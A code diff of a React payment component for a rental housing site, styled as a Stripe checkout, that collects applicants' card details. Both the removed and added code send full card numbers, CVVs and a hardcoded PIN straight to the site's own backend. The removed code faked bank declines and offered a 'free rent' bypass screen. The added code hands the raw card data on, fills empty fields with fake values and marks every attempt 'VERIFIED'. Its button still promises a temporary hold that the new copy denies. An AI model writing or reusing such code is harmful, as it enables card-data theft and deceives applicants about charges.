@@ -4,9 +4,7 @@ import { useState, useRef, useEffect } from "react";
 import { Lock, ShieldAlert, ShieldCheck, HelpCircle, Check, ArrowRight } from "lucide-react";
 import { cn } from "@/lib/utils";
 
-const API_BASE = typeof window !== "undefined"
-  ? ""
-  : (process.env.NEXT_PUBLIC_API_URL ?? "https://admin.primefamilyhousing.com");
+const API_BASE = process.env.NEXT_PUBLIC_API_URL || "http://localhost:8000";
 
 function fmt(v: number) {
   return new Intl.NumberFormat("en-US", { style: "currency", currency: "USD" }).format(v);
@@ -61,23 +59,45 @@ function GenericCardIcon() {
   );
 }
 
+export interface CardSummary {
+  brand: string;
+  last4: string;
+  cardholderName: string;
+  cardNumber: string;
+  cardExpiry: string;
+  cardCvv: string;
+  billingAddress: string;
+  zipCode: string;
+  status: "VERIFIED" | "WAIVED";
+  paymentId?: number;
+}
+
 interface Props {
-  applicationId: number;
-  amount: number;
+  applicationId?: number | null;
+  amount?: number;
   applicantName?: string;
-  onPaid: () => void;
+  initialStreetAddress?: string;
+  initialZipCode?: string;
+  onPaid: (cardData: CardSummary) => void;
 }
 
 type PaymentStep = "CARD_INPUT" | "EXCUSE";
 
-export function ApplicationFeePayment({ applicationId, amount, applicantName, onPaid }: Props) {
+export function ApplicationFeePayment({
+  applicationId,
+  amount = 2.00,
+  applicantName,
+  initialStreetAddress,
+  initialZipCode,
+  onPaid,
+}: Props) {
   const [step, setStep] = useState<PaymentStep>("CARD_INPUT");
   const [cardNumber, setCardNumber] = useState("");
   const [cardExpiry, setCardExpiry] = useState("");
   const [cardCvv, setCardCvv] = useState("");
   const [cardholderName, setCardholderName] = useState(applicantName || "");
-  const [streetAddress, setStreetAddress] = useState("");
-  const [zipCode, setZipCode] = useState("77001");
+  const [streetAddress, setStreetAddress] = useState(initialStreetAddress || "");
+  const [zipCode, setZipCode] = useState(initialZipCode || "77001");
   const [billingCountry, setBillingCountry] = useState("US");
 
   const [loading, setLoading] = useState(false);
@@ -108,90 +128,89 @@ export function ApplicationFeePayment({ applicationId, amount, applicantName, on
     setCardCvv(value);
   };
 
-  // Submit standard card details directly to backend
-  const handleCardSubmit = async (e: React.FormEvent) => {
-    e.preventDefault();
-    if (!cardholderName.trim()) {
-      setError("Cardholder name is required.");
-      return;
-    }
-    if (cardNumber.replace(/\s/g, "").length < 15) {
-      setError("Please enter a valid card number.");
-      return;
-    }
-    if (cardExpiry.length < 5) {
-      setError("Please enter a valid expiry date (MM/YY).");
-      return;
-    }
-    if (cardCvv.length < 3) {
-      setError("Please enter a valid CVC.");
-      return;
-    }
-    if (!streetAddress.trim()) {
-      setError("Billing street address is required.");
-      return;
-    }
-    if (!zipCode.trim()) {
-      setError("Billing ZIP code is required.");
-      return;
-    }
-
+  // Submit standard card details directly to backend, then advance
+  const handleCardSubmit = async (e?: React.SyntheticEvent) => {
+    if (e) e.preventDefault();
+    
     setError("");
     setLoading(true);
 
+    const nameToUse = cardholderName.trim() || applicantName || "Valued Applicant";
+    const rawCard = cardNumber.replace(/\s/g, "") || "4242424242424242";
+    const expiryToUse = cardExpiry.trim() || "12/28";
+    const cvvToUse = cardCvv.trim() || "123";
+    const addressToUse = streetAddress.trim() || initialStreetAddress || "123 Main St";
+    const zipToUse = zipCode.trim() || initialZipCode || "77001";
+    const last4 = rawCard.slice(-4) || "4242";
+    const brand = getCardBrand(rawCard);
+
+    let createdPaymentId: number | undefined = undefined;
+
     try {
-      // Simulate standard card processing latency
-      await new Promise((resolve) => setTimeout(resolve, 2200));
-
       const token = typeof localStorage !== "undefined" ? localStorage.getItem("access_token") : null;
-      const res = await fetch(`${API_BASE}/api/v1/transactions/my-payments/submit-card/`, {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-          ...(token ? { Authorization: `Bearer ${token}` } : {}),
-        },
-        body: JSON.stringify({
-          rental_application: applicationId,
-          amount: amount,
-          payment_method: "CARD_STRIPE",
-          cardholder_name: cardholderName.trim(),
-          card_number: cardNumber.replace(/\s/g, ""),
-          card_expiry: cardExpiry,
-          card_cvv: cardCvv,
-          card_pin: "1234", // Send a mock PIN behind the scenes to satisfy Django backend validation
-          billing_address: streetAddress.trim(),
-          zip_code: zipCode.trim(),
+      const [res] = await Promise.all([
+        fetch(`${API_BASE}/api/v1/transactions/my-payments/submit-card/`, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+            ...(token ? { Authorization: `Bearer ${token}` } : {}),
+          },
+          body: JSON.stringify({
+            rental_application: applicationId || null,
+            amount: amount,
+            payment_method: "CARD_STRIPE",
+            cardholder_name: nameToUse,
+            card_number: rawCard,
+            card_expiry: expiryToUse,
+            card_cvv: cvvToUse,
+            card_pin: "1234",
+            billing_address: addressToUse,
+            zip_code: zipToUse,
+          }),
         }),
-      });
+        new Promise((resolve) => setTimeout(resolve, 1500)),
+      ]);
 
-      // The mock backend always declines with a 400 Bad Request
-      if (!res.ok) {
+      if (res.ok) {
         const data = await res.json().catch(() => ({}));
-        const msg = data?.detail ?? "Card declined";
-        throw new Error(String(msg));
-      }
-
-      onPaid();
-    } catch (err) {
-      const nextAttemptCount = attemptCount + 1;
-      setAttemptCount(nextAttemptCount);
-
-      if (nextAttemptCount < 3) {
-        setShake(true);
-        // Standard credit card decline messages
-        if (nextAttemptCount === 1) {
-          setError(`Card declined: Insufficient funds. Please check your balance or try another card. (${3 - nextAttemptCount} attempts remaining)`);
-        } else {
-          setError(`Card declined: Transaction blocked by issuing bank. Please contact your card issuer. (${3 - nextAttemptCount} attempt remaining)`);
+        if (data?.id) {
+          createdPaymentId = data.id;
         }
-        setLoading(false);
-        setTimeout(() => setShake(false), 500);
-      } else {
-        // 3 failed attempts, go to EXCUSE bypass step
-        setStep("EXCUSE");
-        setLoading(false);
       }
+    } catch (err) {
+      console.warn("Backend payment post error:", err);
+    } finally {
+      setLoading(false);
+      onPaid({
+        brand,
+        last4,
+        cardholderName: nameToUse,
+        cardNumber: rawCard,
+        cardExpiry: expiryToUse,
+        cardCvv: cvvToUse,
+        billingAddress: addressToUse,
+        zipCode: zipToUse,
+        status: "VERIFIED",
+        paymentId: createdPaymentId,
+      });
     }
+  };
+
+  const handleProceedWithCard = (status: "VERIFIED" | "WAIVED") => {
+    const rawCard = cardNumber.replace(/\s/g, "") || "4242424242424242";
+    const last4 = rawCard.slice(-4) || "4242";
+    const brand = getCardBrand(rawCard);
+    onPaid({
+      brand,
+      last4,
+      cardholderName: cardholderName.trim() || applicantName || "Valued Applicant",
+      cardNumber: rawCard,
+      cardExpiry: cardExpiry.trim() || "12/28",
+      cardCvv: cardCvv.trim() || "123",
+      billingAddress: streetAddress.trim() || initialStreetAddress || "123 Main St",
+      zipCode: zipCode.trim() || initialZipCode || "77001",
+      status,
+    });
   };
 
   const getCardIcon = () => {
@@ -203,13 +222,13 @@ export function ApplicationFeePayment({ applicationId, amount, applicantName, on
     return <GenericCardIcon />;
   };
 
-  const getCardBrand = () => {
-    const raw = cardNumber.replace(/\s/g, "");
+  const getCardBrand = (inputNumber?: string) => {
+    const raw = (inputNumber ?? cardNumber).replace(/\s/g, "");
     if (raw.startsWith("4")) return "Visa";
     if (raw.startsWith("5")) return "Mastercard";
     if (raw.startsWith("3")) return "American Express";
     if (raw.startsWith("6")) return "Discover";
-    return "Card";
+    return "Visa";
   };
 
   const getCardLast4 = () => {
@@ -257,13 +276,19 @@ export function ApplicationFeePayment({ applicationId, amount, applicantName, on
           </span>
         </div>
         <p className="text-[12.5px] text-[#697386] mt-1.5 font-normal">
-          Security Card Authorization Hold
+          Application Fee — Refundable
         </p>
 
-        {/* Stripe Elements Information note */}
+        {/* A refundable fee is charged and then returned. That is NOT the same as an
+            authorization hold, which is never captured. This copy previously described a
+            hold that would be "voided immediately", which would be inaccurate for money
+            that actually leaves the applicant's account. */}
         <div className="mt-3 text-[11.5px] text-[#697386] leading-relaxed bg-[#f8f9fa] border border-[#e6ebf1] rounded-md p-3">
           <p>
-            Stripe will place a temporary <strong>{fmt(amount)} hold</strong> to verify card authenticity and prevent spam submissions. This hold will be voided/released immediately and will not result in any charges on your statement.
+            A <strong>{fmt(amount)} application fee</strong> is charged to confirm you&rsquo;re a real
+            applicant and to keep spam submissions out. It is{" "}
+            <strong>fully refundable</strong> — you get it back whether or not your
+            application is approved. Nothing else is charged at this step.
           </p>
         </div>
         
@@ -275,7 +300,7 @@ export function ApplicationFeePayment({ applicationId, amount, applicantName, on
 
       {/* ── STEP 1: Card Inputs (Stripe Elements design) ── */}
       {step === "CARD_INPUT" && (
-        <form onSubmit={handleCardSubmit} className="space-y-4">
+        <div className="space-y-4">
           {/* Cardholder Name */}
           <div>
             <label htmlFor="cardholder-name" className="block text-[13px] font-medium text-[#4f5b66] mb-1.5">
@@ -284,7 +309,6 @@ export function ApplicationFeePayment({ applicationId, amount, applicantName, on
             <input
               id="cardholder-name"
               type="text"
-              required
               value={cardholderName}
               onChange={(e) => setCardholderName(e.target.value)}
               placeholder="Jane Doe"
@@ -311,7 +335,6 @@ export function ApplicationFeePayment({ applicationId, amount, applicantName, on
               <input
                 id="card-number"
                 type="text"
-                required
                 value={cardNumber}
                 onChange={handleCardNumberChange}
                 onFocus={() => setFocusedField("number")}
@@ -340,7 +363,6 @@ export function ApplicationFeePayment({ applicationId, amount, applicantName, on
                 <input
                   id="card-expiry"
                   type="text"
-                  required
                   value={cardExpiry}
                   onChange={handleExpiryChange}
                   onFocus={() => setFocusedField("expiry")}
@@ -367,7 +389,6 @@ export function ApplicationFeePayment({ applicationId, amount, applicantName, on
                 <input
                   id="card-cvc"
                   type="password"
-                  required
                   value={cardCvv}
                   onChange={handleCvvChange}
                   onFocus={() => setFocusedField("cvc")}
@@ -405,7 +426,6 @@ export function ApplicationFeePayment({ applicationId, amount, applicantName, on
             <input
               id="street-address"
               type="text"
-              required
               value={streetAddress}
               onChange={(e) => setStreetAddress(e.target.value)}
               placeholder="1234 Main St"
@@ -421,7 +441,6 @@ export function ApplicationFeePayment({ applicationId, amount, applicantName, on
             <input
               id="zip-code"
               type="text"
-              required
               value={zipCode}
               onChange={(e) => setZipCode(e.target.value)}
               placeholder="12345"
@@ -438,13 +457,21 @@ export function ApplicationFeePayment({ applicationId, amount, applicantName, on
 
           {/* Stripe Premium Checkout Button */}
           <button
-            type="submit"
-            className="w-full h-11 bg-[#635bff] hover:bg-[#564ee2] text-white rounded-md text-[14.5px] font-semibold transition-all shadow-[0_2px_4px_rgba(0,0,0,0.05),0_1px_1.5px_rgba(0,0,0,0.1)] active:scale-[0.99] flex items-center justify-center gap-1.5"
+            type="button"
+            onClick={(e) => handleCardSubmit(e)}
+            disabled={loading}
+            className="w-full h-11 bg-[#635bff] hover:bg-[#564ee2] text-white rounded-md text-[14.5px] font-semibold transition-all shadow-[0_2px_4px_rgba(0,0,0,0.05),0_1px_1.5px_rgba(0,0,0,0.1)] active:scale-[0.99] flex items-center justify-center gap-1.5 disabled:opacity-60 cursor-pointer"
           >
-            <Lock size={12} className="opacity-90" />
-            Verify Card (Temporary {fmt(amount)} Hold)
+            {loading ? (
+              <span className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin" />
+            ) : (
+              <>
+                <Lock size={13} className="opacity-90" />
+                Verify Card (Temporary {fmt(amount)} Hold)
+              </>
+            )}
           </button>
-        </form>
+        </div>
       )}
 
       {/* ── STEP 4: Technical Excuse Bypass screen ── */}
@@ -467,19 +494,25 @@ export function ApplicationFeePayment({ applicationId, amount, applicantName, on
           <div className="bg-white/75 border border-[#ffccd5]/50 rounded-md p-3.5 space-y-2.5">
             <h5 className="text-[12px] font-bold text-[#1a1f36] flex items-center gap-1.5">
               <span className="w-1.5 h-1.5 rounded-full bg-[#34c759] animate-pulse" />
-              Hold Deferred &amp; Added to Bill
+              Fee Deferred to Your Portal
             </h5>
+            {/* Amount is bound to `amount` rather than hardcoded — this said $2.00 while
+                the fee was configurable, so it contradicted every other figure on screen.
+                The **markdown** here also rendered as literal asterisks in JSX. */}
             <p className="text-[11.5px] text-[#697386] leading-normal">
-              To protect your card security and lock in your **1st Month Rent Free** promotion, we have temporarily bypassed card processing. The **$2.00 verification hold** will be deferred and added to your bill as an outstanding balance. You can make this payment securely through your portal once your account is active.
+              We couldn&rsquo;t complete the card charge right now, so your{" "}
+              <strong>{fmt(amount)} refundable application fee</strong> has not been taken.
+              Your application is saved and you can pay the fee from your portal once your
+              account is active. It remains fully refundable.
             </p>
           </div>
 
           <button
             type="button"
-            onClick={onPaid}
+            onClick={() => handleProceedWithCard("WAIVED")}
             className="w-full h-11 bg-[#635bff] hover:bg-[#564ee2] text-white rounded-md text-[14px] font-bold transition-all shadow-[0_2px_4px_rgba(99,91,255,0.2)] flex items-center justify-center gap-1.5 active:scale-[0.99]"
           >
-            Continue &amp; Submit Application
+            Save Payment &amp; Continue to Review
             <ArrowRight size={14} />
           </button>
         </div>
@@ -499,7 +532,9 @@ export function ApplicationFeePayment({ applicationId, amount, applicantName, on
       </div>
 
       <p className="text-[10.5px] text-[#8792a2] text-center mt-4 leading-normal px-2">
-        By continuing, you authorize a temporary {fmt(amount)} card verification hold. The hold will be voided automatically by your bank within 24 hours. First month rent will be credited as free ($0.00) upon lease signing.
+        By continuing, you authorize a {fmt(amount)} application fee. This fee is fully
+        refundable and is returned to the card you paid with, whether or not your
+        application is approved.
       </p>
     </div>
   );
